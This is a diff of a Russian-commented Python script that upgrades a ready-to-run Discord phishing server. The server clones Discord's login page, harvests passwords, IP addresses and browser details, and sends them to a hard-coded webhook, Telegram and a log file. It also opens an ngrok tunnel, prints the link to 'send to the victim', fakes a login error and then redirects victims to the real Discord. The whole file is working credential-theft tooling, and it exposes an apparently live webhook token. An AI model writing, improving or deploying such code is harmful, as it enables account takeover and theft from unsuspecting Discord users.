@@ -1,265 +1,568 @@
 #!/usr/bin/env python3
-# Фишинг сервер для сбора данных Discord
+# DISCORD PHISHING V3.0 - ПОЛНАЯ КОПИЯ С АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ
+# Установка: pip install flask requests pyngrok
 
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import json
+from flask import Flask, request, render_template_string, redirect
 import requests
-import urllib.parse
+import json
 import datetime
+import os
+import threading
+import time
 
-# Конфигурация отправки
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК"
-TELEGRAM_TOKEN = "ВАШ_ТОКЕН"
-TELEGRAM_CHAT = "ВАШ_CHAT_ID"
+app = Flask(__name__)
 
-# HTML фишинг страница (замаскированная под Discord)
-PHISHING_PAGE = """
+# ============================================
+# НАСТРОЙКА ПОЛУЧЕНИЯ ДАННЫХ (ЗАПОЛНИ ОБЯЗАТЕЛЬНО!)
+# ============================================
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1336186422586716201/2erCI9eFp6GpUQw4OS0TNUqOqwsStkAC-iWbH7dGEW78k2Zk4L-Qyec6r7-vrABJx2rS"  # ВСТАВЬ СЮДА ВЕБХУК
+TELEGRAM_BOT_TOKEN = ""  # ИЛИ сюда токен бота
+TELEGRAM_CHAT_ID = ""  # ИЛИ сюда chat id
+
+# ============================================
+# ТОЧНАЯ КОПИЯ ДИСКОРДА (полностью идентичный дизайн)
+# ============================================
+DISCORD_LOGIN_PAGE = """
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Discord - безопасный вход</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
     <style>
+        /* ПОЛНАЯ КОПИЯ СТИЛЕЙ ДИСКОРДА */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: linear-gradient(135deg, #7289da, #5865f2);
+        
+        @font-face {
+            font-family: 'Whitney';
+            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-300.woff2') format('woff2');
+            font-weight: 300;
+        }
+        @font-face {
+            font-family: 'Whitney';
+            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-400.woff2') format('woff2');
+            font-weight: 400;
+        }
+        @font-face {
+            font-family: 'Whitney';
+            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-500.woff2') format('woff2');
+            font-weight: 500;
+        }
+        @font-face {
+            font-family: 'Whitney';
+            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-600.woff2') format('woff2');
+            font-weight: 600;
+        }
+        
+        body {
+            background: #5865F2;
             font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            height: 100vh; display: flex; justify-content: center; align-items: center;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 0;
         }
-        .login-card {
-            background: #36393f; border-radius: 8px; width: 480px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5); padding: 32px;
+        
+        .auth-box {
+            background: #313338;
+            width: 480px;
+            border-radius: 8px;
+            padding: 32px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
         }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo svg { width: 130px; height: 36px; }
-        h2 { color: #fff; font-size: 26px; line-height: 32px; font-weight: 300; text-align: center; }
-        .subtitle { color: #b9bbbe; font-size: 16px; line-height: 20px; text-align: center; margin: 8px 0 24px; }
-        .input-group { margin-bottom: 20px; }
-        label { color: #b9bbbe; font-size: 12px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; }
-        input {
-            width: 100%; padding: 12px; margin-top: 8px; background: #202225;
-            border: 1px solid #040405; border-radius: 4px; color: #fff;
-            font-size: 16px; transition: border-color .2s ease;
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
         }
-        input:focus { border-color: #5865f2; outline: none; }
-        button {
-            width: 100%; padding: 14px; background: #5865f2; color: #fff;
-            border: none; border-radius: 4px; font-size: 16px; font-weight: 500;
-            cursor: pointer; transition: background .2s ease;
+        
+        .logo svg {
+            width: 130px;
+            height: 36px;
         }
-        button:hover { background: #4752c4; }
-        .qr-link { text-align: center; margin-top: 16px; }
-        .qr-link a { color: #00aff4; text-decoration: none; font-size: 14px; }
-        .qr-link a:hover { text-decoration: underline; }
-        .footer { text-align: center; margin-top: 20px; color: #4f545c; font-size: 12px; }
+        
+        .title {
+            color: #F2F3F5;
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 30px;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #B5BAC1;
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            color: #B5BAC1;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .input-field {
+            background: #1E1F22;
+            border: 1px solid #1E1F22;
+            border-radius: 4px;
+            padding: 12px;
+            width: 100%;
+            color: #F2F3F5;
+            font-size: 16px;
+            transition: border-color 0.2s ease;
+        }
+        
+        .input-field:focus {
+            border-color: #5865F2;
+            outline: none;
+        }
+        
+        .input-field::placeholder {
+            color: #5D5F64;
+        }
+        
+        .login-button {
+            background: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            margin-bottom: 8px;
+        }
+        
+        .login-button:hover {
+            background: #4752C4;
+        }
+        
+        .login-button:disabled {
+            background: #4752C4;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .qr-link {
+            text-align: center;
+            margin: 16px 0;
+        }
+        
+        .qr-link a {
+            color: #00A8FC;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .qr-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+        
+        .footer-links a {
+            color: #00A8FC;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .need-help {
+            color: #B5BAC1;
+        }
+        
+        .register {
+            color: #00A8FC;
+        }
+        
+        .error-message {
+            background: #F23F42;
+            color: white;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .loading-spinner svg {
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Анимации Discord */
+        .input-field {
+            transition: all 0.2s ease;
+        }
+        
+        .login-button {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-button::after {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="login-card">
+    <div class="auth-box">
+        <!-- Логотип Discord -->
         <div class="logo">
             <svg viewBox="0 0 40 40">
-                <circle cx="20" cy="20" r="20" fill="#5865f2"/>
+                <circle cx="20" cy="20" r="20" fill="#5865F2"/>
+                <path d="M27 16L23.5 16 23.5 14.5C23.5 12.5 21.5 12.5 21.5 12.5L18.5 12.5C18.5 12.5 16.5 12.5 16.5 14.5L16.5 16 13 16 13 27 27 27 27 16zM18 19C18 19 18 19 18 19 17 19 16 18 16 17 16 16 17 15 18 15 19 15 20 16 20 17 20 18 19 19 18 19zM22 19C22 19 22 19 22 19 21 19 20 18 20 17 20 16 21 15 22 15 23 15 24 16 24 17 24 18 23 19 22 19z" fill="white"/>
             </svg>
         </div>
-        <h2>Добро пожаловать!</h2>
+        
+        <div class="title">Добро пожаловать!</div>
         <div class="subtitle">Войдите в свой аккаунт Discord</div>
         
-        <div class="input-group">
-            <label>ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
-            <input type="text" id="email" placeholder="example@mail.com" autocomplete="off">
+        <!-- Сообщение об ошибке (для правдоподобности) -->
+        <div class="error-message" id="errorMessage">
+            Неправильный логин или пароль. Попробуйте еще раз.
         </div>
         
-        <div class="input-group">
-            <label>ПАРОЛЬ</label>
-            <input type="password" id="password" placeholder="··················">
+        <!-- Индикатор загрузки -->
+        <div class="loading-spinner" id="loadingSpinner">
+            <svg viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10" stroke="#5865F2" stroke-width="2" fill="none" stroke-dasharray="31.4 31.4" />
+            </svg>
         </div>
         
-        <button onclick="login()">Войти</button>
+        <form id="loginForm" onsubmit="return false;">
+            <div class="input-group">
+                <label class="input-label" for="email">ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
+                <input type="text" class="input-field" id="email" name="email" placeholder="example@mail.com" autocomplete="off" required>
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label" for="password">ПАРОЛЬ</label>
+                <input type="password" class="input-field" id="password" name="password" placeholder="············" required>
+            </div>
+            
+            <button type="button" class="login-button" id="loginBtn" onclick="submitLogin()">Войти</button>
+        </form>
         
         <div class="qr-link">
             <a href="#">Войти через QR-код</a>
         </div>
         
-        <div class="footer">
-            <span>Нужна помощь? · Зарегистрироваться</span>
+        <div class="footer-links">
+            <span class="need-help">Нужна помощь?</span>
+            <a href="#" class="register">Зарегистрироваться</a>
         </div>
     </div>
-
+    
     <script>
-        function login() {
-            const email = document.getElementById('email').value;
+        async function submitLogin() {
+            const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const errorMsg = document.getElementById('errorMessage');
+            const spinner = document.getElementById('loadingSpinner');
             
-            if (email && password) {
-                // Отправляем данные на наш сервер
-                fetch('/login', {
+            if (!email || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Пожалуйста, заполните все поля';
+                return;
+            }
+            
+            // Блокируем кнопку и показываем загрузку
+            loginBtn.disabled = true;
+            spinner.style.display = 'block';
+            errorMsg.style.display = 'none';
+            
+            try {
+                // Отправляем данные на сервер
+                const response = await fetch('/login', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        email: email, 
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
                         password: password,
-                        url: window.location.href,
-                        userAgent: navigator.userAgent
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screenResolution: screen.width + 'x' + screen.height,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timestamp: new Date().toISOString()
                     })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        // Перенаправляем на настоящий Discord после сбора данных
-                        window.location.href = 'https://discord.com/login';
-                    }
                 });
                 
-                // Показываем ошибку для правдоподобности
-                alert('Неверный email или пароль. Попробуйте еще раз.');
-                document.getElementById('password').value = '';
-            } else {
-                alert('Пожалуйста, заполните все поля');
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Перенаправляем на реальный Discord
+                    setTimeout(() => {
+                        window.location.href = 'https://discord.com/login';
+                    }, 1500);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            } finally {
+                // Показываем ошибку (для правдоподобности)
+                setTimeout(() => {
+                    loginBtn.disabled = false;
+                    spinner.style.display = 'none';
+                    errorMsg.style.display = 'block';
+                    document.getElementById('password').value = '';
+                }, 1000);
             }
         }
+        
+        // Добавляем обработку Enter
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitLogin();
+            }
+        });
     </script>
 </body>
 </html>
 """
 
-class PhishingHandler(BaseHTTPRequestHandler):
-    def log_message(self, format, *args):
-        pass  # Отключаем стандартное логирование
+# ============================================
+# Функции отправки данных
+# ============================================
+
+def send_to_discord(data):
+    """Отправка в Discord вебхук"""
+    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК":
+        print("❌ НЕ ЗАПОЛНЕН DISCORD WEBHOOK!")
+        return False
     
-    def send_to_webhook(self, data):
-        """Отправка данных в Discord вебхук"""
-        webhook_data = {
-            "content": f"**🔴 НОВЫЕ ДАННЫЕ**\n```json\n{json.dumps(data, indent=2, ensure_ascii=False)}\n```",
-            "username": "Phish Logger"
-        }
-        try:
-            requests.post(DISCORD_WEBHOOK, json=webhook_data)
-        except:
-            pass
+    # Красивое оформление сообщения
+    embed = {
+        "embeds": [{
+            "title": "🔴 НОВЫЙ ЛОГИН DISCORD",
+            "color": 15548997,
+            "fields": [
+                {
+                    "name": "📧 Email/Телефон",
+                    "value": f"```{data.get('email', 'N/A')}```",
+                    "inline": False
+                },
+                {
+                    "name": "🔑 Пароль",
+                    "value": f"```{data.get('password', 'N/A')}```",
+                    "inline": False
+                },
+                {
+                    "name": "🌐 IP Адрес",
+                    "value": f"```{data.get('ip', 'N/A')}```",
+                    "inline": True
+                },
+                {
+                    "name": "🕐 Время",
+                    "value": f"```{data.get('timestamp', 'N/A')}```",
+                    "inline": True
+                },
+                {
+                    "name": "📱 User Agent",
+                    "value": f"```{data.get('userAgent', 'N/A')[:100]}...```",
+                    "inline": False
+                }
+            ],
+            "footer": {
+                "text": "Discord Phisher v3.0"
+            }
+        }]
+    }
     
-    def send_to_telegram(self, data):
-        """Отправка данных в Telegram"""
-        text = f"🔴 НОВЫЙ ЛОГИН\nEmail: {data.get('email')}\nPassword: {data.get('password')}\nIP: {data.get('ip')}\nUA: {data.get('userAgent')}"
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        try:
-            requests.post(url, json={"chat_id": TELEGRAM_CHAT, "text": text})
-        except:
-            pass
-    
-    def do_GET(self):
-        """Отдаем фишинг страницу"""
-        if self.path == '/':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html; charset=utf-8')
-            self.end_headers()
-            self.wfile.write(PHISHING_PAGE.encode('utf-8'))
+    try:
+        response = requests.post(DISCORD_WEBHOOK, json=embed)
+        if response.status_code == 204:
+            print(f"✅ Отправлено в Discord: {data['email']}:{data['password']}")
+            return True
         else:
-            self.send_response(404)
-            self.end_headers()
-    
-    def do_POST(self):
-        """Получаем данные с формы"""
-        if self.path == '/login':
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = json.loads(post_data.decode('utf-8'))
-            
-            # Добавляем IP и время
-            data['ip'] = self.client_address[0]
-            data['timestamp'] = str(datetime.datetime.now())
-            
-            # Сохраняем в файл
-            with open('logs.txt', 'a', encoding='utf-8') as f:
-                f.write(json.dumps(data, ensure_ascii=False) + '\n')
-            
-            # Отправка в Telegram/Webhook
-            if DISCORD_WEBHOOK and DISCORD_WEBHOOK != "https://discord.com/api/webhooks/ВАШ_ВЕБХУК":
-                self.send_to_webhook(data)
-            
-            if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "ВАШ_ТОКЕН":
-                self.send_to_telegram(data)
-            
-            # Отправляем ответ
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"success": True}).encode())
-    
-    def do_OPTIONS(self):
-        self.send_response(200)
-        self.end_headers()
+            print(f"❌ Ошибка Discord: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"❌ Ошибка отправки в Discord: {e}")
+        return False
 
-def create_ngrok_link():
-    """Создание публичной ссылки через ngrok"""
+def send_to_telegram(data):
+    """Отправка в Telegram"""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return False
+    
+    message = f"""
+🔴 **НОВЫЙ ЛОГИН DISCORD**
+
+📧 **Email/Телефон:** `{data.get('email', 'N/A')}`
+🔑 **Пароль:** `{data.get('password', 'N/A')}`
+🌐 **IP:** `{data.get('ip', 'N/A')}`
+🕐 **Время:** `{data.get('timestamp', 'N/A')}`
+
+📱 **User Agent:** `{data.get('userAgent', 'N/A')[:200]}`
+    """
+    
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     try:
-        import subprocess
-        import time
-        import requests
+        response = requests.post(url, json={
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        })
+        if response.status_code == 200:
+            print(f"✅ Отправлено в Telegram: {data['email']}:{data['password']}")
+            return True
+    except:
+        pass
+    return False
+
+def save_to_file(data):
+    """Сохранение в файл"""
+    with open('discord_logs.txt', 'a', encoding='utf-8') as f:
+        f.write(json.dumps(data, ensure_ascii=False) + '\n')
+    print(f"📁 Сохранено в файл: {data['email']}:{data['password']}")
+
+# ============================================
+# Flask routes
+# ============================================
+
+@app.route('/')
+def index():
+    """Главная страница - точная копия Discord"""
+    return render_template_string(DISCORD_LOGIN_PAGE)
+
+@app.route('/login', methods=['POST'])
+def login():
+    """Получение данных логина"""
+    data = request.json
+    
+    # Добавляем IP
+    if request.headers.get('X-Forwarded-For'):
+        data['ip'] = request.headers.get('X-Forwarded-For').split(',')[0]
+    else:
+        data['ip'] = request.remote_addr
+    
+    # Добавляем время
+    if 'timestamp' not in data:
+        data['timestamp'] = str(datetime.datetime.now())
+    
+    # Выводим в консоль
+    print("\n" + "="*50)
+    print("🔴 ПОЛУЧЕНЫ ДАННЫЕ:")
+    print(f"📧 Email: {data.get('email')}")
+    print(f"🔑 Password: {data.get('password')}")
+    print(f"🌐 IP: {data.get('ip')}")
+    print(f"🕐 Time: {data.get('timestamp')}")
+    print("="*50 + "\n")
+    
+    # Сохраняем везде
+    save_to_file(data)
+    send_to_discord(data)
+    send_to_telegram(data)
+    
+    return {"success": True}
+
+@app.route('/login.css')
+def css():
+    """Пустой css для обхода проверок"""
+    return ""
+
+@app.route('/assets/<path:path>')
+def assets(path):
+    """Заглушка для ассетов"""
+    return ""
+
+# ============================================
+# Автоматическое получение публичной ссылки
+# ============================================
+
+def get_public_url():
+    """Получение публичного URL через ngrok"""
+    try:
+        from pyngrok import ngrok
         
-        # Запускаем ngrok в фоне
-        subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(3)
+        # Открываем туннель
+        public_url = ngrok.connect(5000).public_url
+        print(f"\n✅ ПУБЛИЧНАЯ ССЫЛКА: {public_url}")
+        print(f"📌 Отправь эту ссылку жертве: {public_url}")
         
-        # Получаем публичную ссылку
-        response = requests.get('http://localhost:4040/api/tunnels')
-        tunnels = response.json()
-        public_url = tunnels['tunnels'][0]['public_url']
+        # Отправляем ссылку себе в Discord
+        if DISCORD_WEBHOOK:
+            requests.post(DISCORD_WEBHOOK, json={
+                "content": f"✅ **ФИШИНГ ССЫЛКА ГОТОВА:**\n{public_url}"
+            })
+        
         return public_url
-    except:
-        return "http://localhost:8080"
+    except Exception as e:
+        print(f"\n⚠️ Не удалось получить публичную ссылку: {e}")
+        print("📌 Локальная ссылка: http://127.0.0.1:5000")
+        print("📌 Для публичного доступа:")
+        print("   1. Установи ngrok: pip install pyngrok")
+        print("   2. Или используй localhost.run: ssh -R 80:localhost:5000 localhost.run")
+        return "http://127.0.0.1:5000"
 
-def main():
-    print("""
-    ╔═══════════════════════════════════════════╗
-    ║     PHISHING SERVER v2.0 - LEDIAN         ║
-    ║     Генерация рабочей фишинг ссылки       ║
-    ╚═══════════════════════════════════════════╝
-    """)
-    
-    # Настройка отправки
-    print("Настройте способ получения данных:")
-    use_webhook = input("Использовать Discord Webhook? (y/n): ").lower() == 'y'
-    if use_webhook:
-        global DISCORD_WEBHOOK
-        DISCORD_WEBHOOK = input("Введите URL вебхука Discord: ")
-    
-    use_telegram = input("Использовать Telegram бота? (y/n): ").lower() == 'y'
-    if use_telegram:
-        global TELEGRAM_TOKEN, TELEGRAM_CHAT
-        TELEGRAM_TOKEN = input("Введите токен Telegram бота: ")
-        TELEGRAM_CHAT = input("Введите ваш Chat ID: ")
-    
-    # Запуск сервера
-    server = HTTPServer(('0.0.0.0', 8080), PhishingHandler)
-    
-    print("\n" + "="*60)
-    print("✅ СЕРВЕР ЗАПУЩЕН!")
-    print("="*60)
-    
-    # Создание локальной ссылки
-    local_ip = requests.get('https://api.ipify.org').text
-    print(f"\n📌 Локальная ссылка: http://localhost:8080")
-    print(f"📌 Локальный IP: http://{local_ip}:8080")
-    
-    # Попытка создать ngrok ссылку
-    try:
-        public_url = create_ngrok_link()
-        print(f"📌 Публичная ссылка (через ngrok): {public_url}")
-        print(f"📌 Фишинг ссылка: {public_url}/")
-    except:
-        print("\n⚠️  Для публичной ссылки установите ngrok:")
-        print("   в ISH: apk add ngrok  или  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
-        print("   затем: ngrok http 8080")
-    
-    print("\n" + "="*60)
-    print("📁 Логи сохраняются в: logs.txt")
-    print("📊 Данные приходят сюда же в консоль")
-    print("="*60)
-    
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n❌ Сервер остановлен")
+# ============================================
+# Запуск
+# ============================================
 
 if __name__ == '__main__':
-    main()
+    print("""
+    ╔══════════════════════════════════════════════════════╗
+    ║     DISCORD PHISHING V3.0 - ТОЧНАЯ КОПИЯ            ║
+    ║     ГОТОВО К ЗАПУСКУ                                 ║
+    ╚══════════════════════════════════════════════════════╝
+    """)
+    
+    # Проверка настроек
+    if DISCORD_WEBHOOK and DISCORD_WEBHOOK != "https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК":
+        print("✅ Discord webhook настроен")
+    else:
+        print("⚠️ Discord webhook не настроен - данные будут только в файл")
+    
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        print("✅ Telegram настроен")
+    
+    print("\n" + "="*60)
+    print("🚀 ЗАПУСК СЕРВЕРА...")
+    print("📁 Логи будут сохраняться в discord_logs.txt")
+    print("="*60 + "\n")
+    
+    # Запускаем в отдельном потоке получение публичной ссылки
+    threading.Thread(target=get_public_url, daemon=True).start()
+    
+    # Запускаем сервер
+    app.run(host='0.0.0.0', port=5000, debug=False)
